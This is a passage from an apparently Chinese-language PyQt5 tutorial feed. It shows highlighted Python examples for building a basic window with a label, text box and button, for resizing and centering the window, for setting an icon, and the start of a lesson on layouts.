<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    label </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> QLabel</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"账号"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, w)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    label.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">setGeometry</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">20</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">20</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">30</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">20</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">    # 文本框</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    edit </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> QLineEdit</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(w)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    edit.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">setPlaceholderText</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"请输入账号"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    edit.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">setGeometry</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">55</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">20</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">200</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">20</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">    # 在窗口里面添加控件</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    btn </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> QPushButton</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"注册"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, w)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    btn.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">setGeometry</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">50</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">80</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">70</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">30</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">    # 展示窗口</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    w.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">show</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">    # 程序进行循环等待状态</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    app.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">exec</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>运行效果：</p>
<p></p>
<h3>4. 调整窗口大小</h3>
<div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-python"><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> sys</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">from</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> PyQt5.QtWidgets </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> QApplication, QWidget</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">if</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> __name__</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> ==</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> '__main__'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    app </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> QApplication</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(sys.argv)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    w </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> QWidget</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">    # 设置窗口标题</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    w.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">setWindowTitle</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"第一个PyQt"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">    # 窗口的大小</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    w.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">resize</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">300</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">300</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">    # 展示窗口</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    w.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">show</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">    # 程序进行循环等待状态</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    app.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">exec</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>运行效果：</p>
<p></p>
<h3>5. 窗口显示在屏幕的中间</h3>
<div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-python"><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> sys</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">from</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> PyQt5.QtWidgets </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> QApplication, QWidget, QDesktopWidget</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">if</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> __name__</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> ==</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> '__main__'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    app </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> QApplication</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(sys.argv)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    w </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> QWidget</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">    # 设置窗口标题</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    w.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">setWindowTitle</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"第一个PyQt"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">    # 窗口的大小</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    w.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">resize</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">300</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">300</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">    # 将窗口设置在屏幕的左上角</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">    # w.move(0, 0)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">    # 调整窗口在屏幕中央显示</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    center_pointer </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> QDesktopWidget</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">().</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">availableGeometry</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">().</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">center</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    x </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> center_pointer.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">x</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    y </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> center_pointer.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">y</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">    # w.move(x, y)</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">    # w.move(x-150, y-150)</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">    print</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(w.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">frameGeometry</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">())</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">    print</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(w.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">frameGeometry</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">().</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">getRect</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">())</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">    print</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">type</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(w.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">frameGeometry</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">().</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">getRect</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()))</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    old_x, old_y, width, height </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> w.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">frameGeometry</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">().</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">getRect</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    w.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">move</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(x </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> width </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 2</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, y </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> height </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 2</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">    # 展示窗口</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    w.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">show</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">    # 程序进行循环等待状态</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    app.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">exec</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>不在中央的样子</p>
<p></p>
<p>在中央的样子</p>
<p></p>
<h3>6. 设置窗口icon</h3>
<p>可以下载icon图标网站：<a href="https://www.geekery.cn/about/friend.html#%E5%9B%BE%E6%A0%87%E4%BB%93%E5%BA%93" target="_blank" rel="noopener noreferrer">https://www.geekery.cn/about/friend.html#%E5%9B%BE%E6%A0%87%E4%BB%93%E5%BA%93</a></p>
<div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-python"><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> sys</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">from</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> PyQt5.QtGui </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> QIcon</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">from</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> PyQt5.QtWidgets </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> QApplication, QWidget</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">if</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> __name__</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> ==</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> '__main__'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    app </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> QApplication</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(sys.argv)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">    # 创建一个QWidget</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    w </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> QWidget</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">    # 设置标题</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    w.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">setWindowTitle</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"看看我图标帅吗"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">    # 设置图标</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    w.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">setWindowIcon</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">QIcon</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'panda.png'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">))</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">    # 显示QWidget</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    w.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">show</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    app.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">exec</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>003-布局</title>
      <link>https://www.geekery.cn/PyQt5%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B-%E7%8E%8B%E9%93%AD%E4%B8%9C/003-%E5%B8%83%E5%B1%80.html</link>
      <guid>https://www.geekery.cn/PyQt5%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B-%E7%8E%8B%E9%93%AD%E4%B8%9C/003-%E5%B8%83%E5%B1%80.html</guid>
      <source url="https://www.geekery.cn/rss.xml">003-布局</source>
      <description>003-布局 在Qt里面布局分为四个大类 ： QBoxLayout QGridLayout QFormLayout QStackedLayout 一、QBoxLayout 直译为：盒子布局 一般使用它的两个子类QHBoxLayout 和 QVBoxLayout 负责水平和垂直布局 垂直布局示例： 运行效果： image-2020111919123284...</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<p>在Qt里面布局分为四个大类 ：</p>
<ul>
<li>QBoxLayout</li>
<li>QGridLayout</li>
<li>QFormLayout</li>
<li>QStackedLayout</li>
</ul>
<h2>一、QBoxLayout</h2>
<p>直译为：盒子布局</p>
<p>一般使用它的两个子类<code>QHBoxLayout</code>  和  <code>QVBoxLayout</code> 负责水平和垂直布局</p>
<p>垂直布局示例：</p>
<div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-python"><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> sys</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">from</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> PyQt5.QtWidgets </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> QApplication, QVBoxLayout, QWidget, QPushButton, QGroupBox, QMainWindow</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">from</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> PyQt5.QtCore </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> Qt</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">class</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B"> MyWindow</span><span style="--shiki-light:#C18401;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B">QWidget</span><span style="--shiki-light:#C18401;--shiki-dark:#ABB2BF">)</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">    def</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> __init__</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E5C07B;--shiki-dark-font-style:italic">self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">):</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">        # 切记一定要调用父类的__init__方法，因为它里面有很多对UI空间的初始化操作</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">        super</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">().</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">__init__</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">        # 设置大小</span></span>
